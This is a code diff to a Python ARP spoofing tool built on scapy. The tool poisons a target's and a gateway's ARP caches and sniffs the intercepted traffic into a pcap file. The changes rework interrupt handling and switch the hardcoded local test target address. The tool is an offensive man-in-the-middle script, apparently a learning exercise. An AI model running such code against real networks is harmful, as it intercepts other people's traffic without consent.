@@ -1,7 +1,9 @@
 from multiprocessing import Process
 from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap)
 from colorama import Fore, Back, Style
+import os
 import sys
+import subprocess
 import time
 
 if not 'SUDO_UID' in os.environ.keys():
@@ -48,9 +50,7 @@ class Arper:
             sys.exit()
 
         except KeyboardInterrupt:
-            self.poison_thread.terminate() ###
-            self.sniff_thread.terminate() ###
-            sys.exit()
+            pass
 
     def poison(self):
         
@@ -95,10 +95,7 @@ class Arper:
                 sys.exit()
 
             except KeyboardInterrupt:
-                print('Test: exiting poison func to enter restore func...') ### testing
-                
-                self.restore()
-                sys.exit() ###
+                pass
 
     def sniff(self):
 
@@ -123,12 +120,14 @@ class Arper:
 
             self.poison_thread.terminate() ###
             self.sniff_thread.terminate() ### 
+            
             sys.exit()
 
         except KeyboardInterrupt:
-            self.poison_thread.terminate() ###
-            self.sniff_thread.terminate() ### 
-            sys.exit()
+            if self.count == 0:
+                sys.exit()
+            else:
+                pass
         
         else:
             wrpcap(filename, packets)
@@ -136,7 +135,7 @@ class Arper:
             self.restore()
             print(f'\n[{Fore.GREEN}+{Style.RESET_ALL}] Sniffing finnished succesfully.')
             self.poison_thread.terminate() ###
-            #self.sniff_thread.terminate() ### 
+            
             
 
     def restore(self):
@@ -154,14 +153,12 @@ class Arper:
             sys.exit()
 
         except KeyboardInterrupt:
-            self.poison_thread.terminate() ###
-            self.sniff_thread.terminate() ### 
-            #sys.exit()
+            pass
 
         else:
             print(f'[{Fore.GREEN}+{Style.RESET_ALL}] ARP tables restored.')
             self.poison_thread.terminate() ###
-            #self.sniff_thread.terminate() ### 
+
 
 def arpspoof(target, gateway, iface, count=0):
 
@@ -169,5 +166,5 @@ def arpspoof(target, gateway, iface, count=0):
     arp.run()
 
 if __name__ == '__main__': # for test
-    arpspoof('192.168.1.249', '192.168.1.2', 'wlp1s0', 100)
+    arpspoof('192.168.1.241', '192.168.1.2', 'wlp1s0', 100)
    
